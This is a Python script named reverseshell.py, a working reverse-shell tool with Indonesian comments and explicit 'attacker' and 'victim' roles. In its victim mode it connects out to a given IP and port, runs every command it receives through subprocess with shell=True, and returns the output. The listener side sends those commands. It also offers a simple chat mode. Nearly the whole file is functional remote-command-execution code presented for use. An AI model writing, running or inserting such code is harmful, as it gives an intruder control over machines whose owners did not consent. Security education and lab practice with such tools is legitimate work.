from getopt import getopt
import sys 
import os
from threading import Thread
import socket
import subprocess

TARGET=""
PORT=0
LISTEN=False
COMMAND=False
MESSAGE=False


def main():
    global TARGET, PORT, LISTEN, COMMAND, MESSAGE
    
    args,_=getopt(sys.argv[1:], "t:p:lc", ["target=", "port=", "listen", "command"]) 
    
    for key,value in args:
        if key=="-t" or key=="--target":
            TARGET=value
        elif key=="-p" or key=="--port":
            PORT=value
        elif key=="-l" or key=="--listen":
            LISTEN=True
        elif key=="-c" or key=="--command":
            COMMAND=True
    
    try:
        PORT=int(PORT)
    except:
        print("Port number must be numeric")
        return

    if TARGET!="" and LISTEN==False: # victim
        try:
            socket.inet_aton(TARGET)
        except:
            print("target cannot be a string or a DNS name")
            return
        if COMMAND==False:
            MESSAGE=True
        if PORT<10 or PORT>4096:
            print("Port number must be between 10-4096")
            return
        victim()

    elif TARGET=="" and LISTEN==True: # attacker
        if COMMAND==False:
            MESSAGE=True
        if PORT<10 or PORT>4096:
            print("Port number must be between 10-4096")
            return
        attacker()
    
    else:
        print("""Usage:
reverseshell.py -p [port] -l
reverseshell.py -t [target_host] -p [port]
reverseshell.py -p [port] -l -c
reverseshell.py -t [target_host] -p [port] -c

Description:
-t --target  - set target
-p --port    - set port to be used (between 10 and 4096)
-l --listen  - listen on [target]:[port] for incoming connection
-c --command - initialize a command shell

Example:
reverseshell.py -p 8000 -l
reverseshell.py -t 127.0.0.1 -p 8000
reverseshell.py -p 8000 -l -c
reverseshell.py -t 127.0.0.1 -p 8000 -c""")
            
    # print(TARGET)
    # print(PORT)
    # print(LISTEN)
    # print(COMMAND)
    # print(MESSAGE)

def attacker():
    global TARGET, PORT, LISTEN, COMMAND, MESSAGE

    attacker_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.bind(('',PORT))
    attacker_socket.listen(5)
    print("[*] Waiting for connection ...")

    con,addr=attacker_socket.accept()
    print(f"[*] Connection has been established | {addr[0]}:{addr[1]}")

    if COMMAND==True or MESSAGE==True:

        send=Thread(target=send_message, args=(con,))
        receive=Thread(target=receive_message, args=(con,))
        send.start()
        receive.start()
        send.join()
        receive.join()
        
    attacker_socket.close()
    con.close()
    print("[*] Connection closed")


def victim():
    global TARGET, PORT, LISTEN, COMMAND, MESSAGE

    victim_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    victim_socket.connect((TARGET,PORT))
    print("[*] Connection has been established")

    if COMMAND==True: # untuk execute command

        while True:
            try:
                data=victim_socket.recv(4096).decode()
            except:
                break

            if data=="exit":
                print("[*] Connection closed")
                victim_socket.close()
                sys.exit()
                break

            if data[0:2]=="cd":
                try:
                    os.chdir(data[3:])
                except Exception as eror:
                    print(eror)
            
            process=subprocess.Popen(data, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output,error=process.communicate()

            if output==b"":
                victim_socket.send(error)
            else:
                victim_socket.send(output)
                continue
    
    elif MESSAGE==True: # utk message biasa

        send=Thread(target=send_message, args=(victim_socket,))
        receive=Thread(target=receive_message, args=(victim_socket,))
        
        send.start()
        receive.start()

        send.join()
        receive.join()
    # victim_socket.shutdown(socket.SHUT_RDWR)
    victim_socket.close()
    print("[*] Connection closed")

def send_message(con):
    global COMMAND

    while True:
        if COMMAND==True:
            command=input()
            if command=="exit":
                con.close()
                sys.exit()
                break
            try:
                con.send(command.encode())
            except:
                break
        else:
            message=input("Message to send: \n")
            if message=="exit":
                con.close()
                sys.exit()
                break
            try:
                con.send(message.encode())
            except:
                break

def receive_message(con):
    global COMMAND
    while True:
        try:
            message=con.recv(4096).decode()
        except:
            break

        if message=="exit":
            con.close()
            sys.exit()
            break
        if COMMAND==True:
            print(message)
        print("-"*50)
        print(message)
        print("-"*50)
        
if __name__ == "__main__":
    main()